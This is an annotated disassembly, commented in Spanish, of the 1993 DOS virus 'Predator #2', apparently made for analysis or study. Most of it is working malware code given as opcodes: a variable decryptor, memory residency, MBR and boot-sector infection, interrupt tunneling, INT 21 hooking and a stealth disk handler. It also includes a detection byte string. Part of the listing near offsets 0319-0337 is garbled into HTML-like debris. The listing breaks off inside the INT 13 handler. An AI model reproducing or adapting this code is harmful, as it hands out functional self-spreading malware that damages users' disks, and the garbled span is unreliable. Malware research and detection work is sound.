

0100 E9 01 10                JMP 01104
...
1103 C3                      RET

;------------------- decriptor del virus, generado por el mismo

1104 0E                      PUSH CS                ; Copia CS a DS
1105 1F                      POP DS

1106 BF 92 1A                MOV DI,01A92           ; Desencripta el virus
1109 B8 64 19                MOV AX,01964           ; desde el final
110C B9 BD 04                MOV CX,04BD            ; hasta 111A

110F 49                      DEC CX                 ; La rutina de
1110 78 08                   JS 0111A ; (jmp begin) ; desencripaci¢n
1112 D3 0D                   ROR W[DI],CL           ; es siempre distinta!!
1114 31 05                   XOR W[DI],AX           ; pero solo en la operacion
1116 4F                      DEC DI                 ; y en la clave
1117 4F                      DEC DI                 ;
1118 EB F5                   JMP 0110F              ;

; bytes de decriptor:
; 0E 1F BF ?? ?? B8 ?? ?? B9 BD 04 49 78 08 ?? ?? ?? ?? 4F 4F EB F5
; esto puede ser usado como string de identificacion 100% confiable

;------------------  Comienzo del virus en si

BEGIN:
111A (segun offset anterior)
0000 06                      PUSH ES                ; Salva ES

0001 33 ED                   XOR BP,BP              ; marca que es desde file

0003 B8 FD 50                MOV AX,050FD           ; Verifica si estaba
0006 CD 13                   INT 013                ; residente en memoria
0008 3D 50 FD                CMP AX,0FD50           ; Output: AX

000B 74 72                   JE 07F                 ; Si residente...

000D 8C C0                   MOV AX,ES              ; No estaba.
000F 8B D8                   MOV BX,AX              ; DS=ES-1, BX=AX
0011 48                      DEC AX                 ;
0012 8E D8                   MOV DS,AX              ;
0014 A1 03 00                MOV AX,W[3]            ; AX=Size of DOS Block
0017 2D 76 01                SUB AX,0176            ; Resta 176H p rrafos

001A 72 63                   JB 07F                 ; Si menor se va..

001C 80 FC 10                CMP AH,010             ; Sobran 1000 bytes?

001F 72 5E                   JB 07F                 ; No, se va..

0021 A3 03 00                MOV W[3],AX            ; S¡, cambia el Size
0024 03 C3                   ADD AX,BX              ; AX=ES+resto del block
0026 A3 12 00                MOV W[012],AX          ; Salva en el header
0029 8E C0                   MOV ES,AX              ; ES=176H p rrafos antes
                                                    ; del fin de la memoria

002B 33 FF                   XOR DI,DI              ; DI=0
002D 8E DF                   MOV DS,DI              ; segmento 0
002F 83 2E 13 04 06          SUB W[0413],6          ; Achica la RAM libre
                                                    ; en 6 Kbytes

0034 0E                      PUSH CS                ; DS=CS
0035 1F                      POP DS                 ;

0036 E8 00 00                CALL 039               ; SI = BEGIN (111A)
0039 5E                      POP SI                 ; 1153H - 39H
003A 81 EE 39 00             SUB SI,039             ; =111AH

003E B9 A9 0B                MOV CX,0BA9            ; Contador de words
0041 FC                      CLD                    ; Se mueve al fondo
0042 F3 A5                   REP MOVSW              ; de la memoria.

0044 B8 E6 00                MOV AX,0E6             ; AX=0E6H
0047 06                      PUSH ES                ; Apila direcci¢n de
0048 50                      PUSH AX                ; salto
0049 CB                      RETF                   ; Salta a HI_BEGIN

;------------------------------ copyright

004A 00         db      0
                db      'Predator virus #2  (c) 1993  Priest - Phalcon/Skism'
007E 00         db      0

;-------------------------- volver al prg. original

FIN:
007F 0B ED                   OR BP,BP           ; BP=0?
0081 74 01                   JE 084             ; S¡, salta
0083 CB                      RETF               ; No, fin
                                                ; vuelve boot
                                                ; era infecci¢n desde boot

; ---------------- infecci¢n desde file ------------

0084 E8 00 00                CALL 087           ; Apila offset del POP SI
0087 5E                      POP SI             ; SI -> POP SI
0088 81 C6 B6 07             ADD SI,07B6        ; Suma  87
                                                ;      7B6
                                                ;      ---
                                                ;      83D

                                                ; si= offset 83D de este
                                                ; c¢digo
008C 0E                      PUSH CS            ; DS=CS
008D 1F                      POP DS             ; DS:SI = primeros bytes
                                                ; del c¢digo sin infectar
                                                ; salvados al final

008E FC                      CLD
008F AD                      LODSW              ; compara primer byte prg orig.
0090 3D 5A 4D                CMP AX,04D5A       ; con 4D5A (MZ)
0093 74 17                   JE 0AC
0095 3D 4D 5A                CMP AX,05A4D       ; compara con 5A4D (ZM)
0098 74 12                   JE 0AC

; ------------------ Es .com

009A 07                      POP ES             ; ES = word at top of stack
009B BF 00 01                MOV DI,0100        ; DI = 100
009E 57                      PUSH DI            ; Top of stack: 100
009F AB                      STOSW              ; Guarda primer byte prog orig.
                                                ; en ES:DI (comienzo prog?)

                                                ; DS:SI en ES:DI
00A0 A4                      MOVSB              ; Siguiente byte en sig. locacion?
00A1 5F                      POP DI             ; recupera DI
00A2 06                      PUSH ES            ; Recupera top of stack
00A3 1F                      POP DS
00A4 E8 26 00                CALL 0CD           ; do nothing???
00A7 1E                      PUSH DS            ; recupera stack
00A8 57                      PUSH DI            ; DI: 100h
00A9 33 C0                   XOR AX,AX          ; ax=0
00AB CB                      RETF               ; vuelve al prog. original

; ------------------ En caso de .EXE

00AC 58                      POP AX
00AD 8B D8                   MOV BX,AX            ; BX = top of stack
00AF 05 10 00                ADD AX,010           ; AX = T.O.S. + 10
00B2 01 44 02                ADD W[SI+2],AX       ; lo que hay en SI+2
                                                  ; se le suma AX
00B5 03 44 06                ADD AX,W[SI+6]       ; A AX se suma lo que
                                                  ; hay en  SI+6
00B8 C4 3C                   LES DI,[SI]
00BA E8 10 00                CALL 0CD             ; Do nothing??
00BD FA                      CLI
00BE 8E D0                   MOV SS,AX            ; SS=AX
00C0 8B 64 04                MOV SP,W[SI+4]       ; SP=SI+4
00C3 8E C3                   MOV ES,BX            ; ES= T.O.S.
00C5 8E DB                   MOV DS,BX            ; DS= T.O.S.
00C7 33 C0                   XOR AX,AX            ; AX=0
00C9 FB                      STI
00CA 2E FF 2C                CS JMP D[SI]         ; Volver prg orig.
                                                  ; JMP CS:[SI]


; ---------------------------- Rutina 'do nothing'

00CD 50                      PUSH AX
00CE 26 FF 35                ES PUSH W[DI]        ; push contenido
                                                  ; de lo apuntado por ES:DI
00D1 26 C6 05 CB             ES MOV B[DI],0CB     ; mov en ese lugar 0CB
                                                  ; 0CB= RETF
00D5 E8 00 00                CALL 0D8
00D8 58                      POP AX               ; ax= offset de esta instruccion
00D9 05 09 00                ADD AX,9             ; AX= D8 + 9 = E1
00DC 0E                      PUSH CS
00DD 50                      PUSH AX
00DE 06                      PUSH ES
00DF 57                      PUSH DI
00E0 CB                      RETF                 ; salta a ES:DI (retf)
                                                  ; Vuelve a CS:AX,
                                                  ; sig. instrucci¢n

00E1 26 8F 05                ES POP W[DI]         ; contenido de lo apuntado
                                                  ; por ES:DI se recupera
                                                  ; de stack
00E4 58                      POP AX               ; recupera AX
00E5 C3                      RET                  ; retorno

; --------------------------------------------------

;comienzo del c¢digo movido

; aqu¡ comienza en el caso de que est‚ cargado desde boot

HI_BEGIN:
;------------------------------------------;
; Lee los vectores de INT 13H, 21H y 40H y ;
; los guarda duplicados en OLD_INT_xx y    ;
; OLD_INT_xx + 4 (al fondo)                ;
;------------------------------------------;
00E6 0E                      PUSH CS            ; DS=CS
00E7 1F                      POP DS

00E8 B0 13                   MOV AL,013         ; AL=13H
00EA BF 82 09                MOV DI,0982        ; DI -> OLD_INT_13
00ED B9 02 00                MOV CX,2           ; CX=2

LOOP:
00F0 E8 9E 02                CALL 0391          ; ES:BX = Vector de INT xx
00F3 8C C2                   MOV DX,ES          ; Salva ES en DX
00F5 0E                      PUSH CS            ; ES=CS
00F6 07                      POP ES             ;

00F7 93                      XCHG AX,BX         ; DX:AX = Vector de INT 13H
00F8 F8                      CLC                ; Lo salva en OLD_INT_xx y
00F9 FC                      CLD                ; OLD_INT_xx + 4
00FA AB                      STOSW              ;
00FB 89 45 02                MOV W[DI+2],AX     ;
00FE 92                      XCHG AX,DX         ;
00FF F5                      CMC                ;
0100 72 F7                   JB 0F9             ; La 2nda vez viene sin carry

                                                ; repetir para ints 21h y 40h

0102 83 C7 04                ADD DI,4           ; Saltea copia del vector
0105 49                      DEC CX             ; CX=1, 0 o -1
0106 78 08                   JS 0110            ; Si CX=-1, listo
0108 B0 21                   MOV AL,021         ; AL=21H
010A 75 E4                   JNE 0F0            ; Si CX=1, LOOP con AL=21H
010C B0 40                   MOV AL,040         ; Si CX=0, AL=40H
010E EB E0                   JMP 0F0            ; LOOP


SIGUE:
0110 B0 13                   MOV AL,013         ; Define la nueva INT 13
0112 BA C8 03                MOV DX,03C8        ;
0115 E8 8A 02                CALL 03A2          ; redefinir interrupci¢n

0118 C6 06 79 09 EA          MOV B[0979],0EA    ; Deja un JMP FAR
011D C7 06 7A 09 F2 04       MOV W[097A],04F2   ; a la NEW_INT_21
0123 8C 0E 7C 09             MOV W[097C],CS     ;

0127 B4 01                   MOV AH,1           ; Si no hay hard disk,
0129 B2 80                   MOV DL,080         ; reemplaza el vector
012B CD 13                   INT 013            ; OLD_INT_40 con OLD_INT_13
012D 0A E4                   OR AH,AH           ; int 40 es la int 13 para
012F 74 0A                   JE 013B            ; diskette
0131 BE 82 09                MOV SI,0982        ;
0134 BF 92 09                MOV DI,0992        ;
0137 A5                      MOVSW              ;
0138 A5                      MOVSW              ;
0139 A5                      MOVSW              ;
013A A5                      MOVSW              ;


013B C6 06 6B 03 C3          MOV B[036B],0C3    ; Desactiva XCHG_INT_21

0140 C6 06 C9 03 00          MOV B[03C9],0      ; pone cero en jmp de int 13h
                                                ; - Habilita INT_13_ENTRY


0145 0B ED                   OR BP,BP           ; Si BP<>0: (infectando de boot)
0147 75 2C                   JNE 0175           ; - Salta...
                                                ; va a infecci¢n boot
                                                ; y se va.

; ------------------- sigue si es infeccion de file

                                                ;Si BP=0: (infectando de file)
0149 C6 06 C9 03 38          MOV B[03C9],038    ; Habilita 2ND_INT_13_ENTRY
014E E8 63 01                CALL 02B4          ; - Get vectores originales

0151 2E C5 3E 8A 09          CS LDS DI,[098A]   ; DS:DI -> OLD_INT_21

0156 80 3D EA                CMP B[DI],0EA      ; Si OLD_INT_21 empieza
0159 74 10                   JE 016B            ; con JMP FAR o INT 3?,
015B 80 3D CC                CMP B[DI],0CC      ; salta...
015E 74 0B                   JE 016B            ;

0160 2E C6 06 6B 03 50       CS MOV B[036B],050 ; OLD_INT_21 no comienza
0166 E8 02 02                CALL 036B          ; con JMP FAR ni INT 3:
0169 EB 0A                   JMP 0175           ; - Activa XCHG_INT_21
                                                ; - XCHG_INT_21
                                                ; - Salta

016B 0E                      PUSH CS            ; OLD_INT_21 comienza con
016C 1F                      POP DS             ; JMP FAR o INT 3:
016D BA F2 04                MOV DX,04F2        ; DS=CS
0170 B0 21                   MOV AL,021         ; DS:DX -> NEW_INT_21
0172 E8 2D 02                CALL 03A2          ; SET_INT nro 21

; si es de boot hace desde ac 

0175 0E                      PUSH CS            ; ES=CS
0176 0E                      PUSH CS            ; DS=CS
0177 07                      POP ES             ;
0178 1F                      POP DS             ;

0179 B8 01 02                MOV AX,0201        ; Lee el sector 1
017C BB B8 09                MOV BX,09B8        ; del cilindro 0
017F B9 01 00                MOV CX,1           ; del 1er HD
0182 BA 80 00                MOV DX,080         ; en BOOT_BUFF
0185 E8 6F 06                CALL 07F7          ; (CALL_OLD13)

0188 72 21                   JB 01AB            ; En caso de error...
018A E8 21 00                CALL 01AE          ; Compara con el infectado
018D 74 1C                   JE 01AB            ; Si =, salta a error

018F E8 6A 00                CALL 01FC          ; Si <>, CRYPT_BOOT_BUFF
0192 E8 92 00                CALL 0227          ; CRYPT_ALL (encripta todo virus)

0195 41                      INC CX             ; Sector 2, cilindro 0
0196 B8 06 03                MOV AX,0306        ; Escribe 6 sectores
0199 E8 5B 06                CALL 07F7          ; del cilindro 0
                                                ; copia virus encriptado
                                                ; en HD

019C 72 0D                   JB 01AB            ; En caso de error...

019E E8 5B 00                CALL 01FC          ; Si todo OK CRYPT_BOOT_BUFF
                                                ; (ahora desencripta)
01A1 E8 1D 00                CALL 01C1          ; INFECT_BOOT_BUFF

01A4 B8 01 03                MOV AX,0301        ; Escribe un sector
01A7 49                      DEC CX             ; (El boot infectado)
01A8 E8 4C 06                CALL 07F7          ; int 13h

ERROR:
01AB E9 D1 FE                JMP 07F

; -------------- compara boot con infectado

COMP_ORG_BOOT:
01AE 51                      PUSH CX            ; Salva registros
01AF 56                      PUSH SI            ;
01B0 57                      PUSH DI            ;
01B1 B9 08 00                MOV CX,8           ; CX=8
01B4 BF B8 09                MOV DI,09B8        ; DI -> BOOT_BUFF
01B7 BE 3D 02                MOV SI,023D        ; SI -> BOOT_INT

01BA FC                      CLD                ; Compara 8 bytes
01BB F3 A6                   REPE CMPSB         ;

01BD 5F                      POP DI             ; Recupera registros
01BE 5E                      POP SI
01BF 59                      POP CX
01C0 C3                      RET

; rutina que crea boot encriptado e infectado. Notar que desencriptor es
; siempre igual!

; ----------------------------

INFECT_BOOT_BUFF
01C1 50                      PUSH AX            ; Salva registros
01C2 53                      PUSH BX            ;
01C3 51                      PUSH CX            ;
01C4 52                      PUSH DX            ;
01C5 57                      PUSH DI            ;
01C6 56                      PUSH SI            ;

01C7 B8 FF FF                MOV AX,-1          ;
01CA E8 83 07                CALL 0950          ; RANDOMIZE AX
01CD A3 45 02                MOV W[0245],AX     ; Nro al azar
                                                ; guarda clave en offset 8h

01D0 41                      INC CX             ;
01D1 89 0E 6D 02             MOV W[026D],CX     ; guarda cx + 1 en offset 48h
                                                ; sector que ocupa el virus
                                                ; + 1

01D5 80 E2 80                AND DL,080         ; deja solo bit 7 (HD si o no)
01D8 89 16 70 02             MOV W[0270],DX     ; guarda DX (DL and 80h)
                                                ; en offset 51h
                                                ; head donde guardo el virus

01DC BF B8 09                MOV DI,09B8        ; Destinaci¢n: boot buf
01DF BE 3D 02                MOV SI,023D        ; fuente: boot del virus
01E2 B9 14 00                MOV CX,014         ; copiar 14h bytes boot inf.
01E5 FC                      CLD                ;
01E6 F3 A4                   REP MOVSB          ; copiar los primeros 14h bytes

01E8 91                      XCHG AX,CX         ; ax = 0 cx = nro azar
01E9 BB 32 00                MOV BX,032         ; 32 words = 64 bytes

01EC AD                      LODSW              ; cargo en ax
01ED D3 C0                   ROL AX,CL          ; encripto
01EF AB                      STOSW              ; vuelvo a poner
01F0 D1 C1                   ROL CX,1           ; cambio clave
01F2 4B                      DEC BX             ;
01F3 75 F7                   JNE 01EC           ; sigo hasta terminar

01F5 5E                      POP SI             ; Recupera registros
01F6 5F                      POP DI             ;
01F7 5A                      POP DX             ;
01F8 59                      POP CX             ;
01F9 5B                      POP BX             ;
01FA 58                      POP AX             ;
01FB C3                      RET


; -------------------------------------

CRYPT_BOOT_BUFF:
;--------------------------------------;
; Encripta los 512 bytes del BOOT_BUFF ;
;--------------------------------------;
01FC 51                      PUSH CX            ; Salva registros
01FD 57                      PUSH DI            ;
01FE 56                      PUSH SI            ;

01FF BF B8 09                MOV DI,09B8        ; Encripta los 512 bytes
0202 B9 00 01                MOV CX,0100        ; del BOOT_BUFF
0205 F7 15                   NOT W[DI]          ;
0207 47                      INC DI             ;
0208 47                      INC DI             ;
0209 E2 FA                   LOOP 0205          ;

020B 5E                      POP SI             ; Recupera los registros
020C 5F                      POP DI             ;
020D 59                      POP CX             ;
020E C3                      RET

; --------------------------- mensaje con SHR (o X/2)


020F 90               'Here comes the Predator!'
0210 CA E4 CA
0213 40
0214 C6 DE DA
0217 CA E6 40
021A E8 D0 CA
021D 40
021E A0 E4 CA
0221 C8 C2 E8 DE
0225 E4 42

; ---------------------------------------------


CRYPT_ALL:
;---------------------------;
; Encripta todo             ;
;---------------------------;
0227 51                      PUSH CX            ; Salva registros
0228 57                      PUSH DI            ;
0229 56                      PUSH SI            ;

022A B9 BD 04                MOV CX,04BD        ; Long en words
022D BF B8 0B                MOV DI,0BB8        ; Fin fin
0230 33 F6                   XOR SI,SI          ; SI=0
0232 FC                      CLD

0233 AD                      LODSW              ; Encripta todo el virus
0234 D3 C8                   ROR AX,CL          ;
0236 AB                      STOSW              ;
0237 E2 FA                   LOOP 0233          ;

0239 5E                      POP SI             ; Recupera los registros
023A 5F                      POP DI             ;
023B 59                      POP CX             ;
023C C3                      RET

; --------------------- Boot sector infectado por el virus

BOOT_INT:
;---------------------------;
; 8 bytes testigos del BOOT ;
;---------------------------;
023D FA                      CLI
023E BF 14 7C                MOV DI,07C14
0241 B8 32 00                MOV AX,032


0244 B9 D1 53                MOV CX,053D1       ; Nro al azar, para encripcion

0247 2E D3 0D                CS ROR W[DI],CL
024A D1 C1                   ROL CX,1
024C 47                      INC DI             ; se desencripta
024D 47                      INC DI
024E 48                      DEC AX
024F 75 F6                   JNE 0247   ; repite 32h veces

0251 8E D0                   MOV SS,AX
0253 BC FE FF                MOV SP,-2
0256 FB                      STI               ; redefinir stack

0257 8E D8                   MOV DS,AX         ; DS = 0
0259 8B D8                   MOV BX,AX         ; BX = 0
025B 83 2E 13 04 06          SUB W[0413],6     ; bajar tama¤o de memoria 6 K
0260 CD 12                   INT 012           ; get memory size in AX (en K)

0262 B1 0A                   MOV CL,0A
0264 D3 C8                   ROR AX,CL         ; convertir a segmentos
0266 8E C0                   MOV ES,AX         ; ES = ultimo segmento

0268 95                      XCHG AX,BP        ; BP = ultimo seg.
0269 B8 05 02                MOV AX,0205       ; leer 5 sectores en memoria
                                               ; en ES:BX

026C B9 02 4F                MOV CX,04F02       ; sector donde guard¢ el
                                                ; virus

026F BA 00 01                MOV DX,0100        ; cabeza donde guardo el
                                                ; virus

0272 50                      PUSH AX
0273 51                      PUSH CX            ; Salvar registros

0274 CD 13                   INT 013            ; leer sectores

0276 73 02                   JAE 027A       ; todo OK, sigo
0278 CD 18                   INT 018        ; volver al basic en caso de error

027A 8B FB                   MOV DI,BX      ; ES:DI apuntan al virus cargado

027C B9 BD 04                MOV CX,04BD

027F 26 D3 05                ES ROL W[DI],CL
0282 47                      INC DI           ; desencriptar virus
0283 47                      INC DI
0284 E2 F9                   LOOP 027F        ; 04BDh veces

0286 8E C3                   MOV ES,BX        ; ES = 0
0288 BF EC 7B                MOV DI,07BEC     ; ES:DI apuntan a 14h bytes antes
                                              ; de este sector de booteo cargado
028B B9 14 00                MOV CX,014       ; 14h bytes
028E BE 63 7C                MOV SI,07C63     ; offset 63h del
                                              ; sector de booteo cargado
                                              ; (offset 02A0 en este file)
0291 FC                      CLD
0292 F3 A4                   REP MOVSB        ; copiar

0294 89 6D FE                MOV W[DI-2],BP   ; ultimo word del
                                              ; fragmento copiado
                                              ; poner BP, segmento donde se
                                              ; copi¢ el virus
0297 59                      POP CX
0298 58                      POP AX           ; recuperar registros

0299 B0 01                   MOV AL,1         ; leer un sector
029B 8B DF                   MOV BX,DI        ; ES:BX = 0:7C00h
029D 49                      DEC CX           ; sector de booteo
029E EB 89                   JMP 0229         ; saltar a fragmento
                                              ; anterior

; -------------- bytes a copiar antes del boot

02A0 CD 13                   INT 013         ; leer boot

02A2 73 02                   JAE 02A6        ; si todo mal
02A4 CD 18                   INT 018         ; llamar al BASIC
                                             ; esta estrategia causa que
                                             ; intentar bootear con el
                                             ; virus desde diskette
                                             ; resetee la m quina, ya que
                                             ; hay que insistir un par
                                             ; de veces para que lea sin
                                             ; error el boot

02A6 B9 00 01                MOV CX,0100     ; 100h bytes

02A9 F7 15                   NOT W[DI]
02AB 47                      INC DI
02AC 47                      INC DI
02AD E2 FA                   LOOP 02A9       ; desencriptar todo el boot

02AF 9A E6 00 00 00          CALL 0:0E6      ; llamar a offset 0E6h del virus
                                             ; (HI_BEGIN)
                                             ; se instala en int 13h (o 40h)
                                             ; no en la 21h
                                             ; y vuelve a ejecutar el BOOT
                                             ; original

; --------------------------------

GET_ORG:
;--------------------------------------------------------;
; Calcula los vectores originales de las INT 13, 21 y 40 ;
;--------------------------------------------------------;
02B4 B4 52                   MOV AH,052         ; Funci¢n 52: SYSVARS
02B6 CD 21                   INT 021            ; LLama al DOS
02B8 26 8B 47 FE             ES MOV AX,W[BX-2]  ; Salva el 1st Memory
02BC A3 9A 09                MOV W[099A],AX     ; Control Block del DOS
02BF B0 01                   MOV AL,1           ; AL=1
02C1 E8 CD 00                CALL 0391          ; GET_INT nro 1

02C4 53                      PUSH BX            ; Salva BX (Offset de INT 1)

02C5 BA 02 03                MOV DX,0302        ; NEW_INT_1
02C8 E8 D7 00                CALL 03A2          ; SET_INT nro 1
02CB C6 06 9E 09 00          MOV B[099E],0      ; FLAG_INT=0

02D0 9C                      PUSHF              ; Enciende el Flag T
02D1 5B                      POP BX             ; y lo copia en BX
02D2 80 CF 01                OR BH,1            ;
02D5 53                      PUSH BX            ;
02D6 9D                      POPF               ;

02D7 B4 01                   MOV AH,1           ; AH=1
02D9 E8 1B 05                CALL 07F7          ; LLama a la OLD_13
02DC C6 06 9E 09 01          MOV B[099E],1      ; FLAG_INT=1

02E1 53                      PUSH BX            ; Recupera los flags
02E2 9D                      POPF               ;

02E3 B4 30                   MOV AH,030         ; Get DOS version
02E5 E8 1D 05                CALL 0805          ; CALL_OLD21
02E8 C6 06 9E 09 02          MOV B[099E],2      ; FLAG_INT=2

02ED 53                      PUSH BX            ; Recupera los flags
02EE 9D                      POPF

02EF B4 01                   MOV AH,1           ; Read Diskette Status
02F1 E8 1F 05                CALL 0813          ; CALL_OLD40
02F4 80 E7 FE                AND BH,0FE         ; Apaga el Trap Flag
02F7 53                      PUSH BX            ; y lo copia a BX
02F8 9D                      POPF               ;

02F9 5A                      POP DX             ; DX=Offset de OLD_INT_1

02FA 06                      PUSH ES            ; DS=ES
02FB 1F                      POP DS             ;
02FC B0 01                   MOV AL,1           ;
02FE E8 A1 00                CALL 03A2          ; SET_INT nro 1
0301 C3                      RET


; ------------- handler de la int 1 para tunneling

NEW_INT_1:
0302 55                      PUSH BP            ; Salva BP
0303 8B EC                   MOV BP,SP          ; BP -> Old BP
0305 50                      PUSH AX            ; Salva AX
0306 1E                      PUSH DS            ; Salva DS
0307 0E                      PUSH CS            ; Salva CS
0308 1F                      POP DS             ; DS=CS
0309 8B 46 04                MOV AX,W[BP+4]     ; Seg de rutina interrumpida
030C 80 3E 9E 09 01          CMP B[099E],1      ; Flag=1?
0311 75 18                   JNE 032B           ; No, salta

;  ----------------- int 21h

0313 3B 06 9A 09             CMP AX,W[099A]     ; First Mem Block?
0317 77 0E                   JA 0327            ; Si > se va
0319 A3 8C 09                MOV W[098C],AX     ; Si <=, salva="" en="" la="" copia="" ;="" de="" la="" old_int_21="" 031c="" 8b="" 46="" 02="" mov="" ax,w[bp+2]="" ;="" lee="" el="" offset="" y="" forma="" el="" 031f="" a3="" 8a="" 09="" mov="" w[098a],ax="" ;="" old_int_21="" original="" 0322="" 81="" 66="" 06="" ff="" fe="" and="" w[bp+6],0feff="" ;="" apaga="" el="" trap="" flag="" 0327="" 1f="" pop="" ds="" ;="" recupera="" los="" registros="" 0328="" 58="" pop="" ax="" ;="" 0329="" 5d="" pop="" bp="" ;="" 032a="" cf="" iret=""></=,><>1:
032B 80 3E 9E 09 02          CMP B[099E],2      ; Flag = 2?
0330 77 23                   JA 0355            ; Si > salta

; ---------------------------- int 13h o 40h

0332 3D 00 C8                CMP AX,0C800       ; Seg vs C800 (HD de XT)
0335 72 F0                   JB 0327            ; Si < se="" va="" 0337="" 3d="" 00="" f0="" cmp="" ax,0f000="" ;="" seg="" vs="" f000="" 033a="" 77="" eb="" ja="" 0327="" ;="" si=""> se va

                                                ; Entre C800 y F000
033C 57                      PUSH DI            ; Salva DI
033D BF 82 09                MOV DI,0982        ; DI -> OLD_INT_13
0340 80 3E 9E 09 00          CMP B[099E],0      ; Flag = 0?
0345 74 03                   JE 034A            ; S¡, salta
0347 83 C7 10                ADD DI,010         ; No, DI -> OLD_INT_40

034A 89 45 02                MOV W[DI+2],AX     ; Salva y forma la
034D 8B 46 02                MOV AX,W[BP+2]     ; la OLD_INT_40 o la 13
0350 89 05                   MOV W[DI],AX       ;

0352 5F                      POP DI             ; Recupera DI
0353 EB CD                   JMP 0322           ; Regresa (fin de INT)

; -------------------- llama a XCHG_INT_21 con delay

FLAG>2:
0355 FE 0E 9F 09             DEC B[099F]        ; Inicializado a 5, cuenta
0359 75 CC                   JNE 0327           ; 5 instrucciones
035B E8 0D 00                CALL 036B          ; XCHG_INT_21
035E B0 01                   MOV AL,1           ;
0360 52                      PUSH DX
0361 C5 16 7E 09             LDS DX,[097E]      ; vieja int 1h
0365 E8 3A 00                CALL 03A2          ; la recupera
0368 5A                      POP DX
0369 EB B7                   JMP 0322           ; Regresa (fin de INT)


; ------------------------------------

XCHG_INT_21:
;-------------------------------------------------;
; Reemplaza los 5 primeros bytes de la OLD_INT_21 ;
; con un JMP FAR a la NEW_INT_21                  ;
; Salva esos 5 byte en el offset 979 del TSR      ;
;-------------------------------------------------;
036B 50                      PUSH AX            ; Puede haber un RET

036C 51                      PUSH CX            ; Salva registros
036D 57                      PUSH DI            ;
036E 56                      PUSH SI            ;
036F 1E                      PUSH DS            ;
0370 06                      PUSH ES            ;
0371 9C                      PUSHF              ;

0372 0E                      PUSH CS            ; DS=CS
0373 1F                      POP DS             ;

0374 BE 79 09                MOV SI,0979        ; SI -> Ultima instrucci¢n
0377 C4 3E 8A 09             LES DI,[098A]      ; ES:DI -> Handler de OLD_INT_21
037B B9 05 00                MOV CX,5           ; CX=5

037E FC                      CLD                ; Lee el propio c¢digo
037F AC                      LODSB              ; y lo intercambia
0380 26 86 05                ES XCHG B[DI],AL   ; con el de la INT_21
0383 88 44 FF                MOV B[SI-1],AL     ; Hasta completar 5 bytes
0386 47                      INC DI             ;
0387 E2 F6                   LOOP 037F          ;

0389 9D                      POPF               ; Reponer los registros
038A 07                      POP ES
038B 1F                      POP DS
038C 5E                      POP SI
038D 5F                      POP DI
038E 59                      POP CX
038F 58                      POP AX
0390 C3                      RET

; --------------------------------------------------

GET_INT:
;------------------------------;
;  INPUT:                      ;
;   AL = Nro de interrupci¢n   ;
;                              ;
; OUTPUT:                      ;
;   ES:BX -> Handler de la INT ;
;------------------------------;
0391 50                      PUSH AX            ; Salva AX
0392 1E                      PUSH DS            ; Salva DS
0393 98                      CBW                ; AX=AL
0394 D1 E0                   SHL AX,1           ; Multiplica por 2
0396 D1 E0                   SHL AX,1           ;            por 4
0398 93                      XCHG AX,BX         ; Intercambia con BX
0399 33 C0                   XOR AX,AX          ; AX=0
039B 8E D8                   MOV DS,AX          ; DS=0
039D C4 1F                   LES BX,[BX]        ; ES:BX=Vector de la INT
039F 1F                      POP DS             ; Recupera DS
03A0 58                      POP AX             ; Recupera AX
03A1 C3                      RET

; --------------------------------------------------


SET_INT:
;------------------------------;
;  INPUT:                      ;
;    AL = Nro de INT           ;
;    DS:DX -> Handler          ;
;------------------------------;
03A2 50                      PUSH AX            ; Salva los registros
03A3 53                      PUSH BX            ;
03A4 1E                      PUSH DS            ;
03A5 06                      PUSH ES            ;
03A6 98                      CBW                ; AX=AL*4
03A7 D1 E0                   SHL AX,1           ;
03A9 D1 E0                   SHL AX,1           ;
03AB 93                      XCHG AX,BX         ; Copia en BX
03AC 33 C0                   XOR AX,AX          ; AX=0
03AE 8E C0                   MOV ES,AX          ; ES:BX = Vector
03B0 26 89 17                ES MOV W[BX],DX    ; Salva el Offset
03B3 26 8C 5F 02             ES MOV W[BX+2],DS  ; Salva el Segment
03B7 07                      POP ES             ; Recupera los registros
03B8 1F                      POP DS             ;
03B9 5B                      POP BX             ;
03BA 58                      POP AX             ;
03BB C3                      RET

; -------------------------------------- Mensaje secreto con XOR FF


03BC AB                     ;  'THE PREDATOR'
03BD B7 BA
03BF DF AF AD BA
03C3 BB BE AB
03C6 B0 AD


; ----------- handler int 13 --------------

NEW_INT_13:
03C8 EB 38                   JMP 0402           ; Salta a 2ND_INT_13_ENTRY
                                                ; Pero no siempre porque
                                                ; el "38" es variable

; ------------- en caso de que est‚ infectando desde boot, empieza ac 
; esta rutina busca hookear int 21h

INT_13_ENTRY:
03CA E8 F7 03                CALL 07C4          ; BIG_PUSH
03CD B0 21                   MOV AL,021
03CF E8 BF FF                CALL 0391          ; Get int. 21h
03D2 0E                      PUSH CS
03D3 1F                      POP DS             ; CS = DS
03D4 BF 8A 09                MOV DI,098A
03D7 39 1D                   CMP W[DI],BX       ; es igual a la que ten¡amos
                                                ; previamente?
03D9 75 05                   JNE 03E0           ; no, sigo

03DB E8 F9 03                CALL 07D7          ; BIG_POP
03DE EB 22                   JMP 0402           ; sigo con int 13h virus

03E0 8C C0                   MOV AX,ES          ; salvo ES en AX
03E2 0E                      PUSH CS
03E3 07                      POP ES             ; ES = CS
03E4 3D 00 08                CMP AX,0800        ; ES > 0800?
03E7 77 F2                   JA 03DB            ; sigo con int 13h virus

03E9 FC                      CLD                ;
03EA F8                      CLC                ; carry = 0

03EB 93                      XCHG AX,BX         ; salva el valor de la
03EC AB                      STOSW              ; vieja int 21h
03ED 89 45 02                MOV W[DI+2],AX
03F0 F5                      CMC                ; complement carry
                                                ; (hacer 2 veces el loop)
03F1 72 F8                   JB 03EB            ;

03F3 C6 06 C9 03 38          MOV B[03C9],038    ; desactiva INT_13_ENTRY
03F8 B0 21                   MOV AL,021
03FA BA F2 04                MOV DX,04F2
03FD E8 A2 FF                CALL 03A2           ; set int. 21h a la del virus
0400 EB D9                   JMP 03DB            ; sigo con int 13h virus

; ------- en el caso de que est‚ infectando desde file, empieza ac 

2ND_INT_13_ENTRY:
0402 80 FC 02                CMP AH,2           ; es read sectors?
0405 75 0A                   JNE 0411           ; No, salta..

0407 83 F9 01                CMP CX,1           ; es cyl 0 sect 1?
040A 75 05                   JNE 0411           ; no, salta

040C 80 FE 00                CMP DH,0           ; es head 0?
040F 74 10                   JE 0421            ; si (referencia MBR)
                                                ; rutina stealth?

0411 3D FD 50                CMP AX,050FD       ; Test de presencia?
0414 75 06                   JNE 041C           ; No, salta y sigue vieja int.
0416 B8 50 FD                MOV AX,0FD50       ; si, retornar lo esperado
0419 CA 02 00                RETF 2             ; IRET falso.

